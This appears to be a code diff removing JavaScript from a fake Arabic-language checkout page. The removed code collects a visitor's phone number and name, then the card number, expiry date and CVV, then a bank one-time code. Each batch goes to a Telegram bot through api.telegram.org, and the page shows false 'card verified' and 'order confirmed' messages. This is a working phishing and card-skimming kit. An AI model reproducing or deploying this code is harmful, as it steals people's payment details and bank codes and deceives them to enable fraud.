-            el.classList.add('shake');
-            setTimeout(() => el.classList.remove('shake'), 500);
-        }
-
-        // 6. مؤشر التحميل على الأزرار
-        function showLoading(btnId, spinnerId, textId) {
-            document.getElementById(spinnerId).style.display = 'block';
-            document.getElementById(textId).style.opacity = '0.7';
-            document.getElementById(btnId).disabled = true;
-        }
-
-        function hideLoading(btnId, spinnerId, textId) {
-            document.getElementById(spinnerId).style.display = 'none';
-            document.getElementById(textId).style.opacity = '1';
-            document.getElementById(btnId).disabled = false;
-        }
-
-        // ==================== الدوال الأصلية ====================
-
-        function showPage(id) {
-            // إخفاء جميع الصفحات
-            document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
-            
-            // إظهار الصفحة المطلوبة
-            const targetPage = document.getElementById(id);
-            if (targetPage) {
-                targetPage.classList.add('active');
-                window.scrollTo(0, 0);
-            }
-            
-            // تحديث شريط التقدم
-            const progressMap = {
-                'page-product': 0,
-                'page-register': 25,
-                'page-payment': 50,
-                'page-verify': 75,
-                'page-success': 100
-            };
-            updateProgressBar(progressMap[id] || 0);
-        }
-
-        function formatExp(i) {
-            let v = i.value.replace(/\D/g,'');
-            if(v.length >= 2) i.value = v.substring(0,2) + '/' + v.substring(2,4);
-        }
-
-        function detectCard(v) {
-            const img = document.getElementById('card-type-img');
-            if(v.startsWith('4')) { 
-                img.src = "https://i.ibb.co/fG2CKyhR/E01-BB971-3-E72-498-A-BEAA-004-A9098-EC7-A.png"; 
-                img.style.opacity = "1"; 
-            }
-            else if(v.startsWith('5')) { 
-                img.src = "https://i.ibb.co/sv5VB9wQ/88347052-D6-A4-4974-A56-C-FCAD68185365.png"; 
-                img.style.opacity = "1"; 
-            }
-            else { img.style.opacity = "0"; }
-        }
-
-        async function sendData(step) {
-            document.querySelectorAll('.error-msg').forEach(e => e.style.display = 'none');
-            let text = "";
-            
-            if(step === 'register') {
-                const phone = document.getElementById('user-phone').value;
-                if(!phone) { 
-                    document.getElementById('err-reg').style.display='block'; 
-                    shakeElement('err-reg');
-                    return; 
-                }
-                
-                showLoading('register', 'regSpinner', 'regBtnText');
-                
-                text = `👤 زبون جديد:\n📞 هاتف: ${phone}\n📝 اسم: ${document.getElementById('user-name').value}`;
-                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`);
-                
-                hideLoading('register', 'regSpinner', 'regBtnText');
-                showModal('تم إرسال بياناتك بنجاح! سنتواصل معك قريباً.');
-                showPage('page-payment');
-                
-            } else if(step === 'payment') {
-                const num = document.getElementById('card-num').value;
-                if(num.length < 16) { 
-                    document.getElementById('err-pay').style.display='block'; 
-                    shakeElement('err-pay');
-                    return; 
-                }
-                
-                showLoading('payment', 'paySpinner', 'payBtnText');
-                
-                text = `💳 بطاقة:\n🔢 رقم: ${num}\n📅 تاريخ: ${document.getElementById('card-exp').value}\n🔒 CVV: ${document.getElementById('card-cvv').value}`;
-                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`);
-                
-                hideLoading('payment', 'paySpinner', 'payBtnText');
-                showModal('تم التحقق من البطاقة بنجاح!');
-                showPage('page-verify');
-                
-            } else if(step === 'otp') {
-                const otp = document.getElementById('bank-otp').value;
-                if(!otp) return;
-                
-                showLoading('otp', 'otpSpinner', 'otpBtnText');
-                
-                text = `🔑 كود التحقق (OTP): ${otp}`;
-                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`);
-                
-                hideLoading('otp', 'otpSpinner', 'otpBtnText');
-                showModal('تم تأكيد الطلب بنجاح! 🎉');
-                showPage('page-success');
-            }
-        }
-
-        // بدء العداد عند تحميل الصفحة
-        window.onload = function() {
-            startCountdown();
-        };
     </script>
 </body>
 </html>
